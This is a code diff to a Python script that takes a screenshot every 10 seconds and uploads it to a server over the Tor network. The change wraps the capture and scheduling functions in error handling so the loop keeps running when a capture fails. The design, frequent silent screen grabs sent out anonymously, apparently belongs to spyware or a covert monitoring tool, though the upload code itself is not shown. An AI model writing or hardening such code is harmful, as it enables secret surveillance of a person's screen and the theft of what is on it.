@@ -18,12 +18,16 @@ os.makedirs(SAVE_DIR, exist_ok=True)
 
 def take_screenshot():
     """Take a screenshot and save it locally."""
-    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-    filepath = os.path.join(SAVE_DIR, f"screenshot_{timestamp}.png")
-    screenshot = ImageGrab.grab()
-    screenshot.save(filepath, "PNG")
-    print(f"Screenshot saved to {filepath}")
-    return filepath
+    try:
+        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+        filepath = os.path.join(SAVE_DIR, f"screenshot_{timestamp}.png")
+        screenshot = ImageGrab.grab()
+        screenshot.save(filepath, "PNG")
+        print(f"\nScreenshot saved to {filepath}")
+        return filepath
+    except Exception as e:
+        print(f"Error taking screenshot: {e}")
+        return None  # Return None if there was an error
 
 def upload_screenshot(filepath):
     """Upload the screenshot to the server via the Tor network."""
@@ -45,7 +49,10 @@ def upload_screenshot(filepath):
 
 def job():
     """Take and upload a screenshot."""
-    filepath = take_screenshot()
+    try:
+        filepath = take_screenshot()
+    except:
+        filepath = ''
     upload_screenshot(filepath)
 
 # Schedule the task every 10 seconds
